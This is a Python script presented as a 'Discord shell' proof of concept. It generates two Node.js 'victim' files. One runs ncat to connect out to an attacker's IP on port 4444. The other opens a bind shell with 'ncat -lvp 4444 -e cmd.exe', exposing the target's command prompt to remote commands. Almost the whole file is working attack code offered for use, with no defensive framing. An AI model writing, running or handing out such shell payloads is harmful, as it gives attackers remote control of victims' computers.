# Discord-Shell-POC
# Made by: 0x1CA3
# Date: 5/4/21

import os

os.system("cls")
print(''' 
[1] - Generate a normal ncat shell
[2] - Generator a ncat shell to connect to the targets CMD. [Be able to run any commands]

Pick a option (number)
Ncat must be installed on your machine!
''')

def main():
    while True:
        maininput = input("Option: ")
        if maininput == "1" or maininput == "one":
            option1 = open("victim/victim.js", "w")
            option1.write(''' 
            const utillool = require('util');


            const runshit = utillool.promisify(require('child_process').exec);

            async function executeshit(execom) {
              const { stdout, stderr, error } = await runshit(execom);
              if(stderr){console.error('stderr:', stderr);}
              if(error){console.error('error:', error);}
              return stdout;
            }


            async function executecomz () {
                const execom = 'ncat -nv iphere 4444'; // replace "iphere" with my ip
                const result = await executeshit(execom);
                console.log(result);
            }


            executecomz();
            ''')
            option1.close()
            
            print('''File generated!
            Make sure to edit the file
            to change the IP to your own.
            ''')
            quesoption2 = input("Continue? Y or N: ")
            if quesoption2 == "Y" or quesoption2 == "y":
                os.system("py main.py")
            elif quesoption2 == "N" or quesoption2 == "n":
                exit()
            else:
                print("Wrong Command!")
                exit()
        elif maininput == "2" or maininput == "two":
            option2 = open("victim/victimcmd.js", "w")
            option2.write('''
            const utillool = require('util');


            const runshit = utillool.promisify(require('child_process').exec);

            async function executeshit(execom) {
              const { stdout, stderr, error } = await runshit(execom);
              if(stderr){console.error('stderr:', stderr);}
              if(error){console.error('error:', error);}
              return stdout;
            }


            async function executecomz () {
                const execom = 'ncat -lvp 4444 -e cmd.exe';
                const result = await executeshit(execom);
                console.log(result);
            }


            executecomz();
            ''')
            option2.close()
            print("File generated")
            quesoption1 = input("Continue? Y or N: ")
            if quesoption1 == "Y" or quesoption1 == "y":
                os.system("py main.py")
            elif quesoption1 == "N" or quesoption1 == "n":
                exit()
            else:
                print("Wrong Command!")
                exit()
        else:
            print("Wrong Command! Try Again!")
main()